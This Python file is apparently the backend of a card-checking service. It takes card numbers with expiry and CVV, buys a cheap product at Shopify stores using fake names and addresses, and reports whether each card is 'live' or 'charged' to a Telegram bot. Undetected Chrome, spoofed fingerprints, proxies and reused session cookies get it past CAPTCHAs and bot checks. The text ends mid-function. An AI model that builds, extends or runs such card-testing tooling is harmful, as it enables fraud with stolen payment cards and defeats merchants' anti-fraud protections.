#!/usr/bin/env python3
"""
api.py - Shopi Hybrid Shopify Checkout API v3.0

Production fixes over v2.0
===========================
1. Cookie injection  - captcha_solver shim wires our in-memory cache into
   shopifyapi existing cookie-injection code automatically.  Low-level
   _http_check_with_cookies also injects cookies directly into curl_cffi session.

2. Robust form filling - four-strategy fallback per field:
   name= / autocomplete= / CSS class / placeholder text.
   Payment iframe uses WebDriverWait(frame_to_be_available_and_switch_to_it).
   Shipping retries with fresh address on form-validation errors.

3. Proxy auth guard - Chrome --proxy-server does NOT support user:pass auth.
   If proxy has credentials we skip Selenium and return the HTTP result.

4. ASGI / Quart - replaced Flask + asyncio.run() per request with Quart async
   routes sharing one event loop per process (served by uvicorn).

5. Browser pool asyncio.Semaphore - hard-caps concurrent browser checks at
   BROWSER_POOL_SIZE so the ThreadPoolExecutor never queues more than its threads.
"""
import asyncio, json, logging, os, random, re, sys, threading, time, types
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Optional
from urllib.parse import urlparse

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)-8s %(name)s - %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("shopi.api")

# ── Quart (async Flask drop-in) ──────────────────────────────────────────────
try:
    from quart import Quart, jsonify, request as quart_request
    _QUART_AVAILABLE = True
    logger.info("Quart loaded - async routes active")
except ImportError:
    _QUART_AVAILABLE = False
    logger.warning("Quart not installed - falling back to sync Flask")
    from flask import Flask as _SyncFlask, jsonify, request as quart_request  # noqa

# ── CONFIG ────────────────────────────────────────────────────────────────────

def _env_int(key: str, default: int) -> int:
    val = os.environ.get(key, "")
    try:
        return int(val) if val.strip() else default
    except ValueError:
        logger.warning("Invalid env var %s=%r (expected int) — using default %d",
                       key, val, default)
        return default


def _env_float(key: str, default: float) -> float:
    val = os.environ.get(key, "")
    try:
        return float(val) if val.strip() else default
    except ValueError:
        logger.warning("Invalid env var %s=%r (expected float) — using default %g",
                       key, val, default)
        return default


BROWSER_POOL_SIZE        = _env_int("BROWSER_POOL_SIZE",        2)
BROWSER_CHECKOUT_TIMEOUT = _env_int("BROWSER_CHECKOUT_TIMEOUT", 90)
COOKIE_CACHE_TTL         = _env_int("COOKIE_CACHE_TTL",         3600)
PRODUCT_MIN_PRICE        = _env_float("PRODUCT_MIN_PRICE",      10.0)
PRODUCT_MAX_PRICE        = _env_float("PRODUCT_MAX_PRICE",      40.0)
API_PORT                 = _env_int("PORT",                      5000)
API_HOST                 = os.environ.get("HOST",                "0.0.0.0")
PREWARM_BROWSERS         = os.environ.get("PREWARM_BROWSERS", "1") == "1"

# ── In-memory cookie cache (defined BEFORE the captcha_solver shim) ───────────
_cookie_store: Dict[str, dict]  = {}
_cookie_ts:    Dict[str, float] = {}


def cache_cookies(site_url: str, cookies: dict) -> None:
    if cookies:
        _cookie_store[site_url] = dict(cookies)
        _cookie_ts[site_url]    = time.time()
        logger.info("[CookieCache] Stored %d cookie(s) for %s", len(cookies), site_url)


def get_cached_cookies(site_url: str) -> Optional[dict]:
    ts = _cookie_ts.get(site_url)
    if ts and (time.time() - ts) < COOKIE_CACHE_TTL:
        return _cookie_store.get(site_url)
    return None


# ── captcha_solver shim ───────────────────────────────────────────────────────
# shopifyapi optionally imports captcha_solver for cookie management.
# We provide a thin shim backed by our own cache so its existing injection code
# works automatically without modifying shopifyapi.py.
if "captcha_solver" not in sys.modules:
    _shim = types.ModuleType("captcha_solver")
    _shim.get_cached_cookies       = get_cached_cookies
    _shim.cache_cookies            = cache_cookies
    _shim.is_solver_available      = lambda: True
    _shim.solve_shopify_captcha    = lambda *a, **k: {"solved": False}
    _shim.do_full_browser_checkout = lambda *a, **k: {"solved": False}
    _shim.get_solver_status        = lambda: {"available": True, "type": "browser_pool"}
    sys.modules["captcha_solver"] = _shim
    logger.info("[captcha_solver shim] Installed - cookie cache wired.")

# ── shopifyapi imports (shim must be in sys.modules first) ───────────────────
_SHOPIFYAPI_AVAILABLE   = False
_CURL_CFFI_AVAILABLE    = False
_is_captcha_result      = None
format_proxy            = None
ShopifyAuto             = None
_http_run_shopify_check = None
_create_async_client    = None
_do_one_check_fn        = None
get_random_fingerprint  = None

try:
    import shopifyapi as _sapi
    _http_run_shopify_check = _sapi.run_shopify_check
    _create_async_client    = _sapi._create_async_client
    _do_one_check_fn        = _sapi._do_one_check
    get_random_fingerprint  = _sapi.get_random_fingerprint
    format_proxy            = _sapi.format_proxy
    ShopifyAuto             = _sapi.ShopifyAuto
    _is_captcha_result      = _sapi._is_captcha_result
    _CURL_CFFI_AVAILABLE    = getattr(_sapi, "_CURL_CFFI_AVAILABLE", False)
    _SHOPIFYAPI_AVAILABLE   = True
    logger.info("[shopifyapi] Loaded - curl_cffi=%s", _CURL_CFFI_AVAILABLE)
except ImportError as _e:
    logger.error("[shopifyapi] Import failed: %s", _e)
except AttributeError as _e:
    logger.warning("[shopifyapi] Partial import: %s", _e)
    _SHOPIFYAPI_AVAILABLE = _http_run_shopify_check is not None


def _default_is_captcha(r: dict) -> bool:
    if not r or not isinstance(r, dict):
        return False
    code = str(r.get("error_code", "")).upper()
    msg  = str(r.get("message",    "")).upper()
    tn   = str(r.get("__typename", "")).upper()
    return ("CAPTCHA" in code or "CAPTCHA" in msg
            or "CHECKPOINT" in code or tn == "CHECKPOINTDENIED")


if _is_captcha_result is None:
    _is_captcha_result = _default_is_captcha

# ── Selenium availability ─────────────────────────────────────────────────────
_uc_available       = False
_selenium_available = False

try:
    import undetected_chromedriver as uc
    _uc_available = True
    logger.info("[selenium] undetected_chromedriver loaded")
except (ImportError, SyntaxError, Exception):
    pass

try:
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support.ui import Select as SeleniumSelect
    from selenium.common.exceptions import (
        NoSuchElementException, TimeoutException, NoSuchFrameException,
    )
    _selenium_available = True
    if not _uc_available:
        logger.info("[selenium] standard selenium loaded (no undetected_chromedriver)")
except ImportError:
    logger.warning("[selenium] not installed - CAPTCHA browser fallback disabled")

# ── Proxy helpers ─────────────────────────────────────────────────────────────

def _has_proxy_credentials(proxy_url: Optional[str]) -> bool:
    if not proxy_url:
        return False
    try:
        p = urlparse(proxy_url if "://" in proxy_url else "http://" + proxy_url)
        return bool(p.username)
    except Exception:
        return "@" in proxy_url


def _proxy_host_port(proxy_url: str) -> Optional[str]:
    try:
        p = urlparse(proxy_url if "://" in proxy_url else "http://" + proxy_url)
        host = p.hostname or ""
        port = p.port
        if host:
            return "%s:%s" % (host, port) if port else host
    except Exception:
        pass
    m = re.search(r"(?:[^@]+@)?([a-zA-Z0-9._-]+:\d+)", proxy_url)
    return m.group(1) if m else None

# ── Address pool ──────────────────────────────────────────────────────────────
_FALLBACK_ADDRESSES = [
    {"fname": "Michael", "lname": "Johnson", "email_user": "michael.j",
     "add1": "742 Evergreen Terrace", "city": "Springfield",
     "state_short": "IL", "zip": "62701", "phone": "2175550101"},
    {"fname": "Sarah", "lname": "Williams", "email_user": "sarah.w",
     "add1": "1600 Pennsylvania Ave NW", "city": "Washington",
     "state_short": "DC", "zip": "20500", "phone": "2025550143"},
    {"fname": "David", "lname": "Brown", "email_user": "d.brown",
     "add1": "350 Fifth Avenue", "city": "New York",
     "state_short": "NY", "zip": "10118", "phone": "2125550187"},
    {"fname": "Emily", "lname": "Davis", "email_user": "emily.d",
     "add1": "233 S Wacker Drive", "city": "Chicago",
     "state_short": "IL", "zip": "60606", "phone": "3125550122"},
    {"fname": "James", "lname": "Wilson", "email_user": "j.wilson",
     "add1": "1 Microsoft Way", "city": "Redmond",
     "state_short": "WA", "zip": "98052", "phone": "4255550199"},
]
_EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]


def _random_info() -> dict:
    if ShopifyAuto is not None:
        try:
            info = ShopifyAuto().get_random_info()
            if info and info.get("fname"):
                return info
        except Exception:
            pass
    addr = random.choice(_FALLBACK_ADDRESSES).copy()
    addr["email"] = "%s%d@%s" % (
        addr["email_user"], random.randint(10, 9999),
        random.choice(_EMAIL_DOMAINS))
    return addr

# ── Selenium Browser Pool ─────────────────────────────────────────────────────

class _SeleniumBrowserPool:
    """
    Pool of N Chrome instances for CAPTCHA bypass.

    - ThreadPoolExecutor(max_workers=N): each thread owns one browser (thread-local).
    - asyncio.Semaphore(N): prevents more than N concurrent browser checks from queuing.
    - Proxy auth guard: skip Selenium if proxy has user:pass credentials.
    """

    def __init__(self, pool_size: int = BROWSER_POOL_SIZE):
        self.pool_size = pool_size
        self._executor = ThreadPoolExecutor(
            max_workers=pool_size,
            thread_name_prefix="shopi_browser",
        )
        self._local = threading.local()
        self._sem: Optional[asyncio.Semaphore] = None
        logger.info("[BrowserPool] Initialized (size=%d)", pool_size)

    # ── Async entry point ──────────────────────────────────────────────────────

    async def run_checkout(
        self,
        site_url:  str,
        cc:        str,
        mon:       str,
        year:      str,
        cvv:       str,
        proxy_url: Optional[str] = None,
    ) -> dict:
        """Non-blocking browser checkout. Returns shopifyapi-shaped result dict."""
        if not _selenium_available:
            return {"status": "Error", "message": "Selenium not available",
                    "error_code": "SELENIUM_UNAVAILABLE"}
        if _has_proxy_credentials(proxy_url):
            logger.warning(
                "[BrowserPool] Proxy has credentials - skipping Selenium "
                "(Chrome --proxy-server does not support user:pass auth). "
                "Returning HTTP result."
            )
            return {"status": "Error",
                    "message": "Proxy auth unsupported by Selenium",
                    "error_code": "PROXY_AUTH_UNSUPPORTED"}
        if self._sem is None:
            self._sem = asyncio.Semaphore(self.pool_size)
        async with self._sem:
            info_pool = [_random_info() for _ in range(3)]
            loop = asyncio.get_event_loop()
            try:
                result = await asyncio.wait_for(
                    loop.run_in_executor(
                        self._executor,
                        self._checkout_sync,
                        site_url, cc, mon, year, cvv, info_pool, proxy_url,
                    ),
                    timeout=float(BROWSER_CHECKOUT_TIMEOUT),
                )
                return result
            except asyncio.TimeoutError:
                logger.error("[BrowserPool] Timeout for %s", site_url)
                return {"status": "Error", "message": "Browser checkout timed out",
                        "error_code": "BROWSER_TIMEOUT"}
            except Exception as e:
                logger.error("[BrowserPool] Unexpected error: %s", e)
                return {"status": "Error", "message": str(e)[:100]}

    # ── Chrome driver management ───────────────────────────────────────────────

    def _get_driver(self, proxy_url=None):
        """Return (or recreate) the thread-local Chrome driver."""
        driver = getattr(self._local, "driver", None)
        if driver is not None:
            try:
                _ = driver.current_url
                return driver
            except Exception:
                try:
                    driver.quit()
                except Exception:
                    pass
                self._local.driver = None
        self._local.driver = self._create_driver(proxy_url)
        return self._local.driver

    def _create_driver(self, proxy_url=None):
        chrome_args = [
            "--disable-blink-features=AutomationControlled",
            "--disable-dev-shm-usage",
            "--no-sandbox",
            "--disable-gpu",
            "--disable-software-rasterizer",
            "--window-size=1366,768",
            "--disable-extensions",
            "--disable-infobars",
            "--headless=new",
            "--lang=en-US,en",
        ]
        if proxy_url and not _has_proxy_credentials(proxy_url):
            hp = _proxy_host_port(proxy_url)
            if hp:
                chrome_args.append("--proxy-server=" + hp)
        if _uc_available:
            opts = uc.ChromeOptions()
            for a in chrome_args:
                opts.add_argument(a)
            driver = uc.Chrome(options=opts, use_subprocess=True)
        elif _selenium_available:
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options
            opts = Options()
            for a in chrome_args:
                opts.add_argument(a)
            driver = webdriver.Chrome(options=opts)
        else:
            raise RuntimeError("No Selenium driver available")
        driver.set_page_load_timeout(30)
        driver.implicitly_wait(0)
        logger.debug("[BrowserPool] Created Chrome on %s",
                     threading.current_thread().name)
        return driver

    def _kill_driver(self):
        d = getattr(self._local, "driver", None)
        if d:
            try:
                d.quit()
            except Exception:
                pass
        self._local.driver = None

    # ── Main checkout (runs synchronously in ThreadPoolExecutor) ─────────────

    def _checkout_sync(
        self,
        site_url:  str,
        cc:        str,
        mon:       str,
        year:      str,
        cvv:       str,
        info_pool: List[dict],
        proxy_url: Optional[str] = None,
    ) -> dict:
        """Full browser checkout. Runs in worker thread; never blocks event loop."""
        try:
            driver    = self._get_driver(proxy_url)
            price_str = "0.00"

            # Step 1: fetch product list
            try:
                driver.get(site_url + "/products.json")
                time.sleep(0.8)
                body = driver.find_element(By.TAG_NAME, "pre").text
                data = json.loads(body)
                products = data.get("products") or []
            except Exception as e:
                return {"status": "Error",
                        "message": "Products fetch: " + str(e)[:60]}

            variant_id = None
            for prod in products:
                for v in (prod.get("variants") or []):
                    try:
                        pv = float(str(v.get("price") or "0").replace(",", ""))
                        if PRODUCT_MIN_PRICE <= pv <= PRODUCT_MAX_PRICE:
                            variant_id = v["id"]
                            price_str  = str(v.get("price") or pv)
                            break
                    except (ValueError, TypeError):
                        continue
                if variant_id:
                    break

            if not variant_id:
                return {"status": "Error",
                        "message": "No products in $10-$40 range"}

            # Step 2: add to cart
            driver.get("%s/cart/add?id=%s&quantity=1" % (site_url, variant_id))
            time.sleep(1.0)

            # Step 3: navigate to checkout
            driver.get(site_url + "/checkout")
            time.sleep(3.0)

            # Step 4: wait for CAPTCHA / checkpoint to clear (up to 40s)
            deadline = time.time() + 40
            while time.time() < deadline:
                cur = driver.current_url.lower()
                if "checkpoint" not in cur and "captcha" not in cur:
                    break
                time.sleep(2.0)
            else:
                if any(kw in driver.current_url.lower()
                       for kw in ("checkpoint", "captcha")):
                    return {"status": "Error",
                            "message": "CAPTCHA not resolved by browser",
                            "error_code": "CAPTCHA_REQUIRED"}

            # Step 5: fill shipping (with address-pool retry on form errors)
            for info in info_pool:
                try:
                    self._fill_shipping(driver, info)
                    time.sleep(2.0)
                    body_lc = driver.find_element(
                        By.TAG_NAME, "body").text.lower()
                    if any(kw in body_lc for kw in (
                        "enter a valid", "address is required",
                        "not deliverable", "invalid zip",
                        "postal code is invalid",
                    )):
                        logger.debug(
                            "[BrowserPool] Shipping validation error on %s; "
                            "retrying with next address", site_url)
                        driver.get(site_url + "/checkout")
                        time.sleep(2.0)
                        continue
                    break
                except Exception:
                    continue

            # Step 6: fill payment form
            time.sleep(1.5)
            try:
                self._fill_payment(driver, cc, mon, year, cvv)
            except Exception as pe:
                logger.warning("[BrowserPool] Payment fill error: %s", pe)

            # Step 7: wait for result page
            time.sleep(4.0)

            # Step 8: capture cookies for future CAPTCHA bypass
            try:
                cookies = {c["name"]: c["value"] for c in driver.get_cookies()}
            except Exception:
                cookies = {}

            # Step 9: classify result
            final_url = driver.current_url.lower()
            try:
                page_text = driver.find_element(
                    By.TAG_NAME, "body").text.lower()
            except Exception:
                page_text = ""

            if "/thank" in final_url or "/orders/" in final_url:
                return {"status": "Charged", "message": "CARD CHARGED",
                        "price": price_str, "gateway": "Shopify Payments",
                        "cookies": cookies}

            if (any(kw in final_url for kw in
                    ("3ds", "challenge", "authentication"))
                    or "action_required" in page_text
                    or "3d secure" in page_text):
                return {"status": "Approved", "message": "3DS Required",
                        "error_code": "3DS_REQUIRED",
                        "price": price_str, "gateway": "Shopify Payments",
                        "challenge_url": driver.current_url,
                        "cookies": cookies}

            if "insufficient" in page_text:
                return {"status": "Approved",
                        "message": "Card live (insufficient funds)",
                        "error_code": "INSUFFICIENT_FUNDS",
                        "price": price_str, "gateway": "Shopify Payments",
                        "cookies": cookies}

            if any(kw in page_text for kw in (
                "card was declined", "do not honor", "declined",
                "payment was declined", "invalid card",
            )):
                return {"status": "Declined", "message": "Card declined",
                        "error_code": "CARD_DECLINED",
                        "price": price_str, "gateway": "Shopify Payments",
                        "cookies": cookies}

            return {"status": "Error",
                    "message": "Unknown browser result: " + final_url[:60],
                    "price": price_str, "gateway": "Shopify Payments",
                    "cookies": cookies}

        except Exception as e:
            logger.error("[BrowserPool] _checkout_sync crashed: %s", e,
                         exc_info=True)
            self._kill_driver()
            return {"status": "Error",
                    "message": "Browser error: " + str(e)[:80]}

    # ── Form-filling helpers ───────────────────────────────────────────────────

    @staticmethod
    def _fill_field(
        driver,
        value: str,
        *,
        names:        Optional[List[str]] = None,
        autocompletes:Optional[List[str]] = None,
        css_classes:  Optional[List[str]] = None,
        placeholders: Optional[List[str]] = None,
    ) -> bool:
        """
        Four-strategy fallback field filler.
        1. input[name="..."]        2. input[autocomplete="..."]
        3. input[class*="..."]      4. placeholder text match
        Returns True on first successful fill.
        """
        def _set(el, val):
            try:
                el.clear()
                el.send_keys(val)
                return True
            except Exception:
                return False

        for n in (names or []):
            try:
                el = driver.find_element(
                    By.CSS_SELECTOR, 'input[name="%s"]' % n)
                if _set(el, value):
                    return True
            except NoSuchElementException:
                continue

        for a in (autocompletes or []):
            try:
                el = driver.find_element(
                    By.CSS_SELECTOR, 'input[autocomplete="%s"]' % a)
                if _set(el, value):
                    return True
            except NoSuchElementException:
                continue

        for cls in (css_classes or []):
            try:
                els = driver.find_elements(
                    By.CSS_SELECTOR, 'input[class*="%s"]' % cls)
                for el in els:
                    if el.is_displayed() and el.is_enabled():
                        if _set(el, value):
                            return True
            except Exception:
                continue

        for ph in (placeholders or []):
            try:
                for el in driver.find_elements(By.TAG_NAME, "input"):
                    if not el.is_displayed():
                        continue
                    attr = (el.get_attribute("placeholder") or "").lower()
                    if ph.lower() in attr:
                        if _set(el, value):
                            return True
            except Exception:
                continue

        return False

    def _fill_shipping(self, driver, info: dict) -> None:
        """Fill contact + shipping fields using multi-strategy lookup."""
        fname = info.get("fname", "John")
        lname = info.get("lname", "Smith")
        email = info.get("email",
                         "test%d@gmail.com" % random.randint(1, 9999))
        add1  = info.get("add1",  "742 Evergreen Terrace")
        city  = info.get("city",  "Springfield")
        state = info.get("state_short", "IL")
        zip_  = str(info.get("zip", "62701"))
        phone = info.get("phone", "2175550101")
        F = self._fill_field

        F(driver, email,
          names=["email", "contact"],
          autocompletes=["email", "username"],
          css_classes=["field__input"],
          placeholders=["email", "e-mail"])

        F(driver, fname,
          names=["firstName", "first_name", "given-name"],
          autocompletes=["given-name"],
          css_classes=["field__input", "input--text"],
          placeholders=["first name", "first"])

        F(driver, lname,
          names=["lastName", "last_name", "family-name"],
          autocompletes=["family-name"],
          css_classes=["field__input"],
          placeholders=["last name", "last"])

        F(driver, add1,
          names=["address1", "address"],
          autocompletes=["address-line1", "street-address"],
          css_classes=["field__input"],
          placeholders=["address", "street"])

        F(driver, city,
          names=["city"],
          autocompletes=["address-level2"],
          css_classes=["field__input"],
          placeholders=["city", "town"])

        F(driver, zip_,
          names=["postalCode", "zip", "postal_code", "postal-code"],
          autocompletes=["postal-code"],
          css_classes=["field__input"],
          placeholders=["zip", "postal", "postcode"])

        F(driver, phone,
          names=["phone", "telephone", "tel"],
          autocompletes=["tel"],
          css_classes=["field__input"],
          placeholders=["phone", "mobile", "telephone"])

        # State / province select
        for sel_css in [
            'select[name="zone"]',
            'select[name="province"]',
            'select[autocomplete="address-level1"]',
        ]:
            try:
                el  = driver.find_element(By.CSS_SELECTOR, sel_css)
                sel = SeleniumSelect(el)
                for opt in sel.options:
                    v = (opt.get_attribute("value") or "").upper()
                    if v == state.upper() or v.startswith(state.upper()):
                        sel.select_by_value(opt.get_attribute("value"))
                        break
                break
            except (NoSuchElementException, Exception):
                continue

        # Continue / Submit
        for btn_sel in [
            'button[type="submit"]',
            'button[data-trekkie-id="continue_to_shipping_button"]',
            'input[type="submit"]',
        ]:
            try:
                btn = driver.find_element(By.CSS_SELECTOR, btn_sel)
                if btn.is_displayed() and btn.is_enabled():
                    btn.click()
                    time.sleep(2.0)
                    break
            except (NoSuchElementException, Exception):
                continue

    def _fill_payment(self, driver, cc, mon, year, cvv) -> None:
        """Fill payment form; handles direct fields and Shopify split iframes."""
        wait   = WebDriverWait(driver, 15)
        expiry = "%s/%s" % (mon, year[-2:])
        F      = self._fill_field

        # Attempt 1: direct fields (some themes skip iframes)
        cc_filled = F(driver, cc,
                      names=["number", "cardnumber", "card-number"],
                      autocompletes=["cc-number"],
                      css_classes=["card__number", "card-number"],
                      placeholders=["card number", "card no"])

        if cc_filled:
            F(driver, expiry,
              names=["expiry", "expiration", "exp-date"],
              autocompletes=["cc-exp"],
              placeholders=["mm / yy", "mm/yy", "expiry", "expiration"])
            F(driver, cvv,
              names=["verificationValue", "cvv", "cvc", "security-code"],
              autocompletes=["cc-csc"],
              placeholders=["cvv", "cvc", "security code", "security"])
        else:
            # Attempt 2: Shopify split-iframe payment form
            def _enter_iframe(css_pats, field_names, field_ac, field_ph, val):
                for pat in css_pats:
                    try:
                        fr = driver.find_element(By.CSS_SELECTOR, pat)
                        wait.until(
                            EC.frame_to_be_available_and_switch_to_it(fr))
                        F(driver, val, names=field_names,
                          autocompletes=field_ac, placeholders=field_ph)
                        driver.switch_to.default_content()
                        return
                    except (NoSuchElementException, TimeoutException,
                            Exception):
                        try:
                            driver.switch_to.default_content()
                        except Exception:
                            pass

            _enter_iframe(
                ['iframe[name*="card-fields-number"]',
                 'iframe[id*="card-fields-number"]',
                 'iframe[src*="shopifycs"]'],
                ["number", "cardNumber"], ["cc-number"],
                ["card number"], cc)

            _enter_iframe(
                ['iframe[name*="card-fields-expiry"]',
                 'iframe[name*="expiry"]'],
                ["expiry", "expiration"], ["cc-exp"],
                ["mm / yy", "expiry"], expiry)

            _enter_iframe(
                ['iframe[name*="card-fields-verification"]',
                 'iframe[name*="cvv"]', 'iframe[name*="cvc"]'],
                ["verificationValue", "cvv", "cvc"], ["cc-csc"],
                ["cvv", "cvc", "security code"], cvv)

        # Click Pay / Complete Order
        pay_selectors = [
            'button[data-trekkie-id="complete_order_button"]',
            'button[type="submit"][aria-label*="Pay"]',
            'button[type="submit"][aria-label*="Complete"]',
            '#checkout-pay-button',
            'button[type="submit"]',
            'input[type="submit"]',
        ]
        for ps in pay_selectors:
            try:
                btn = driver.find_element(By.CSS_SELECTOR, ps)
                if btn.is_displayed() and btn.is_enabled():
                    btn.click()
                    time.sleep(3.5)
                    return
            except (NoSuchElementException, Exception):
                continue

    def shutdown(self) -> None:
        logger.info("[BrowserPool] Shutting down...")
        futs = [self._executor.submit(self._kill_driver)
                for _ in range(self.pool_size)]
        for f in futs:
            try:
                f.result(timeout=5)
            except Exception:
                pass
        self._executor.shutdown(wait=False)


# ── Global browser pool (lazy, thread-safe) ───────────────────────────────────
_browser_pool: Optional[_SeleniumBrowserPool] = None
_pool_init_lock = threading.Lock()


def _get_browser_pool() -> _SeleniumBrowserPool:
    global _browser_pool
    if _browser_pool is None:
        with _pool_init_lock:
            if _browser_pool is None:
                _browser_pool = _SeleniumBrowserPool(BROWSER_POOL_SIZE)
    return _browser_pool


# ── HTTP checkout with optional cookie injection ───────────────────────────────

async def _http_check_with_cookies(
    site_url:  str,
    cc_string: str,
    proxy_url: Optional[str] = None,
    cookies:   Optional[dict] = None,
    timeout:   float = 90.0,
) -> dict:
    """
    Run curl_cffi HTTP checkout.  If cookies are provided AND the internal
    shopifyapi helpers (_create_async_client, _do_one_check) are available,
    inject cookies directly into the curl_cffi session before any request.
    Falls back to run_shopify_check (which uses the captcha_solver shim) when
    the internal helpers are not importable.
    """
    if not _SHOPIFYAPI_AVAILABLE:
        return {"status": "Error", "message": "shopifyapi not loaded"}

    if (cookies
            and _create_async_client is not None
            and _do_one_check_fn is not None
            and get_random_fingerprint is not None):
        parts = cc_string.strip().split("|")
        if len(parts) != 4:
            return {"status": "Error", "message": "Invalid cc format"}
        cc, mon, year, cvv = parts

        formatted_proxy = None
        if proxy_url and format_proxy is not None:
            try:
                formatted_proxy = format_proxy(proxy_url)
            except Exception:
                formatted_proxy = proxy_url

        fingerprint = get_random_fingerprint()
        try:
            async with _create_async_client(
                proxy_url=formatted_proxy,
                timeout=20.0,
                chrome_version=fingerprint.get("_chrome_ver"),
            ) as session:
                injected = 0
                for name, value in cookies.items():
                    try:
                        if hasattr(session, "_s") and hasattr(session._s, "cookies"):
                            session._s.cookies.set(name, str(value))
                            injected += 1
                        elif hasattr(session, "cookies"):
                            session.cookies.set(name, str(value))
                            injected += 1
                    except Exception as _ce:
                        logger.debug("[HTTP] Failed to inject cookie %s: %s",
                                     name, _ce)
                if injected:
                    logger.info("[HTTP] Injected %d cached cookie(s) for %s",
                                injected, site_url)
                elif cookies:
                    logger.warning(
                        "[HTTP] Cookie injection failed for %s — "
                        "session structure may have changed (injected=0/%d)",
                        site_url, len(cookies)
                    )
                result = await asyncio.wait_for(
                    _do_one_check_fn(
                        session, site_url, cc, mon, year, cvv, fingerprint,
                        proxy_url=formatted_proxy, verbose=False,
                    ),
                    timeout=float(timeout),
                )
                return result
        except asyncio.TimeoutError:
            return {"status": "Error", "message": "Timeout"}
        except Exception as e:
            logger.warning("[HTTP] _http_check_with_cookies direct path error: %s", e)
            # Fall through to high-level call

    # High-level path — captcha_solver shim handles cookie injection
    try:
        return await asyncio.wait_for(
            _http_run_shopify_check(
                site_url,
                cc_string,
                proxy_url=proxy_url,
                verbose=False,
                timeout=timeout,
                max_captcha_retries=0,
            ),
            timeout=float(timeout),
        )
    except asyncio.TimeoutError:
        return {"status": "Error", "message": "Timeout"}
    except Exception as e:
        return {"status": "Error", "message": str(e)[:200]}


# ── Result translation ─────────────────────────────────────────────────────────

_PRESERVE_CODES = frozenset({
    "3DS_REQUIRED", "DS_REQUIRED",
    "ORDER_PLACED", "CAPTCHA_REQUIRED",
    "INSUFFICIENT_FUNDS", "OTP_REQUIRED", "CARD_DECLINED",
})


def _extract_clean_code(message: str) -> str:
    if not message:
        return "UNKNOWN_ERROR"
    upper = message.upper()
    for s in _PRESERVE_CODES:
        pat = r"(?<![A-Z0-9_])" + re.escape(s) + r"(?![A-Z0-9_])"
        if re.search(pat, upper):
            return "3DS_REQUIRED" if s in ("3DS_REQUIRED", "DS_REQUIRED") else s
    m = re.search(r"\b([A-Z][A-Z0-9]{2,}(?:_[A-Z0-9]+)+)\b", message)
    if m:
        return m.group(1)
    return message[:50].strip() or "UNKNOWN_ERROR"


def _translate_result(shop_result: dict, cc_string: str) -> dict:
    """Convert shopifyapi result dict to Telegram-bot-compatible JSON."""
    status     = shop_result.get("status", "Error")
    error_code = (shop_result.get("error_code") or "").strip()
    message    = (shop_result.get("message")    or "").strip()
    price_raw  = shop_result.get("price") or "0.00"
    gateway    = shop_result.get("gateway") or "Shopify Payments"

    challenge_url = shop_result.get("challenge_url") or ""
    if not challenge_url:
        action = (shop_result.get("raw_receipt") or {}).get("action") or {}
        challenge_url = action.get("offsiteRedirect") or action.get("url") or ""

    if status == "Charged":
        response_code = "ORDER_PLACED"
        is_live = True
    elif status == "Approved":
        ec = error_code.upper()
        if "3DS_REQUIRED" in ec or ec == "DS_REQUIRED":
            response_code = "3DS_REQUIRED"
        elif "INSUFFICIENT" in ec:
            response_code = "INSUFFICIENT_FUNDS"
        elif error_code:
            response_code = error_code
        else:
            response_code = _extract_clean_code(message) or "APPROVED"
        is_live = True
    elif status == "Declined":
        response_code = error_code or _extract_clean_code(message) or "CARD_DECLINED"
        is_live = False
    else:
        response_code = error_code or _extract_clean_code(message) or "ERROR"
        is_live = False

    try:
        price_float = float(
            str(price_raw).replace("$", "").replace(",", "").strip()
        )
    except (ValueError, TypeError):
        price_float = 0.0

    out: dict = {
        "Gateway":  gateway,
        "Price":    price_float,
        "Response": response_code,
        "Status":   is_live,
        "cc":       cc_string,
    }
    if challenge_url:
        out["challenge_url"] = challenge_url
    return out


# ── Orchestrator ───────────────────────────────────────────────────────────────

async def run_check(
    site_url:  str,
    cc_string: str,
    proxy_url: Optional[str] = None,
) -> dict:
    """
    Orchestrate one card check:
      1. Look up per-site cookie cache.
      2. Primary HTTP checkout (with injected cookies when cached).
      3. On CAPTCHA: proxy-credential guard -> Selenium browser fallback.
      4. Cache browser cookies for next time (same site = CAPTCHA skipped).
      5. Return bot-compatible JSON.
    """
    if not _SHOPIFYAPI_AVAILABLE:
        return {"Gateway": "UNKNOWN", "Price": 0.0,
                "Response": "ERROR_NO_BACKEND", "Status": False,
                "cc": cc_string}

    cached_cookies = get_cached_cookies(site_url)

    try:
        http_result = await _http_check_with_cookies(
            site_url, cc_string,
            proxy_url=proxy_url,
            cookies=cached_cookies,
            timeout=90.0,
        )
    except Exception as e:
        logger.warning("[run_check] Primary HTTP exception: %s", e)
        http_result = {"status": "Error", "message": str(e)[:120]}

    # Non-CAPTCHA result -> done
    if not _is_captcha_result(http_result):
        return _translate_result(http_result, cc_string)

    # CAPTCHA detected
    cc_prefix = cc_string.split("|")[0][:6] if "|" in cc_string else cc_string[:6]
    logger.info("[run_check] CAPTCHA on %s | cc=%sxxxxxx | proxy=%s",
                site_url, cc_prefix, (proxy_url or "none")[:25])

    # Proxy has credentials -> Chrome cannot use it, skip Selenium
    if _has_proxy_credentials(proxy_url):
        logger.warning(
            "[run_check] Proxy has credentials - Selenium skipped for %s "
            "(Chrome --proxy-server does not support auth proxies).", site_url)
        out = _translate_result(http_result, cc_string)
        out["Response"] = "CAPTCHA_REQUIRED"
        out["Status"]   = False
        return out

    # Selenium not installed
    if not _selenium_available:
        out = _translate_result(http_result, cc_string)
        out["Response"] = "CAPTCHA_REQUIRED"
        out["Status"]   = False
        return out

    # Parse card
    parts = cc_string.strip().split("|")
    if len(parts) != 4:
        return {"Gateway": "UNKNOWN", "Price": 0.0,
                "Response": "ERROR_INVALID_CC", "Status": False,
                "cc": cc_string}
    cc, mon, year, cvv = parts

    pool           = _get_browser_pool()
    browser_result = await pool.run_checkout(
        site_url, cc, mon, year, cvv, proxy_url)

    # If Selenium failed for non-timeout reasons, return HTTP result so the
    # bot at least sees the actual error (CAPTCHA_REQUIRED) instead of a
    # generic SERVER_ERROR.
    if (browser_result.get("status") == "Error"
            and browser_result.get("error_code") in (
                "SELENIUM_UNAVAILABLE", "PROXY_AUTH_UNSUPPORTED", None)):
